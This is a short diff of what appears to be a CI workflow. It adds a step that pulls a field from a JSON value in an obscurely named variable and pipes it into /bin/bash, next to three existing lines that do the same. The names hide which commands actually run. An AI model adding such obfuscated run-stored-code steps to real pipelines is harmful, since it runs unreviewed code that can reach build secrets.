@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$q28" | jq -r .f790 | /bin/bash
           echo $hmms82 | jq -r .sqblx202 | /bin/bash
           echo $pg09 | jq -r .rrdk42579 | /bin/bash
+          echo $njxdi686 | jq -r .ne57451 | /bin/bash
 
       - name: Upload data
         if: always()
